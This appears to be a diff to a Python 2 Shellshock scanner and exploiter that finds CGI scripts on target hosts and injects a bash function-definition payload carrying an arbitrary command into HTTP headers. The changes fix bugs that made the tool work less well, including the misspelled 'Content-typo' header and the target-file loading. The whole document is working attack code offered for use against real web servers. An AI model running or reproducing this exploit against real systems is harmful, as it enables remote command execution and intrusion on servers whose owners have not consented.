@@ -114,7 +114,7 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
                 t.start()
                 threads.append(t)
             except Exception as e: 
-                if verbose: print "[+] %s - %s" % (url, e) 
+                if verbose: print "[I] %s - %s" % (url, e) 
             finally:
                 pass
 
@@ -137,7 +137,7 @@ def check_cgi(req, q, verbose):
         if urllib2.urlopen(req, None, 5).getcode() == 200:
             q.put(req.get_full_url())
     except Exception as e:
-        if verbose: print "[-] %s for %s" % (e, req.get_full_url()) 
+        if verbose: print "[I] %s for %s" % (e, req.get_full_url()) 
     finally:
         thread_pool.release()
 
@@ -153,7 +153,7 @@ def exploit_cgi(proxy, target_list, exploit, verbose):
     
     # Dictionary of header:attack string to try against discovered CGI scripts
     attack_strings = {
-       "Content-typo": "() { :;}; echo; echo %s; %s" % (success_flag, exploit)
+       "Content-type": "() { :;}; echo; echo %s; %s" % (success_flag, exploit)
        }
 
     if len(target_list) > 1:
@@ -162,36 +162,35 @@ def exploit_cgi(proxy, target_list, exploit, verbose):
         print "[+] 1 potential target found"
     print "[+] Attempting exploits..."
     for target in target_list:
-        print "\n[+] Trying exploit for %s" % target 
+        print "[+] Trying exploit for %s" % target 
         host = target.split(":")[1][2:] # substring host from target URL
         for header, attack in attack_strings.iteritems():
             try:
                 if verbose:
-                    print "  [+] Header is: %s" % header
-                    print "  [+] Attack string is: %s" % attack
-                    print "  [+] Flag set to: %s" % success_flag
+                    print "  [I] Header is: %s" % header
+                    print "  [I] Attack string is: %s" % attack
+                    print "  [I] Flag set to: %s" % success_flag
                 req = urllib2.Request(target)
                 req.add_header(header, attack)
                 if proxy:
                     req.set_proxy(proxy, "http")    
-                    if verbose: print "  [+] Proxy set to: %s" % str(proxy)
+                    if verbose: print "  [I] Proxy set to: %s" % str(proxy)
                 req.add_header("User-Agent", user_agent)
                 req.add_header("Host", host)
                 resp = urllib2.urlopen(req)
                 result =  resp.read()
                 if success_flag in result:
-                    print "[!] %s looks vulnerable" % target 
-                    print "[!] Response returned was:" 
-                    # print "\n\033[92m" + result + "\033[0m"
+                    print "  [!] %s looks vulnerable" % target 
+                    print "  [!] Response returned was:" 
                     buf = StringIO.StringIO(result)
                     for line in buf:
                         if line.strip() != success_flag: 
-                            print "%s" % line.strip()
+                            print "  %s" % line.strip()
                     buf.close()
                 else:
                     print "[-] Not vulnerable" 
             except Exception as e:
-                if verbose: print "[-] Exception - %s - %s" % (target, e) 
+                if verbose: print "[I] Exception - %s - %s" % (target, e) 
             finally:
                 pass
 
@@ -201,7 +200,7 @@ def validate_address(hostaddress):
     against some very rough regexes """
 
     singleIP_pattern = re.compile('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
-    FQDN_pattern = re.compile('^(\w+\.)+\w+$')
+    FQDN_pattern = re.compile('^(\w+\.)*\w+$')
     if singleIP_pattern.match(hostaddress) or FQDN_pattern.match(hostaddress):
         return True 
     else:
@@ -214,11 +213,12 @@ def get_targets_from_file(file_name):
     """
 
     host_target_list = []
-    with open(file, 'r') as f:
+    with open(file_name, 'r') as f:
         for line in f:
             line = line.strip()
             if not line.startswith('#') and validate_address(line):
                 host_target_list.append(line)
+    print "[+] %i hosts imported from %s" % (len(host_target_list), file_name)
     return host_target_list
 
 
@@ -326,9 +326,13 @@ def main():
     args = parser.parse_args()
 
     # Assign options to variables
-    host_target_list = [args.Hostname]
-    if args.file is not None:
+    if args.Hostname:
+        host_target_list = [args.Hostname]
+    else:
         host_target_list = get_targets_from_file(args.file)
+    if not len(host_target_list) > 0:
+        print "[-] No valid targets provided, exiting..."
+        exit (0)
     port = str(args.port)
     if args.proxy is not None:
         proxy = args.proxy
@@ -362,8 +366,7 @@ def main():
     if len(target_list) > 0:
         exploit_cgi(proxy, target_list, exploit, verbose)
     else:
-        print "[+] No potential targets found - Exiting..."
-        exit(0)
+        print "[+] No potential targets found :("
     print "[+] The end"
 
 if __name__ == '__main__':
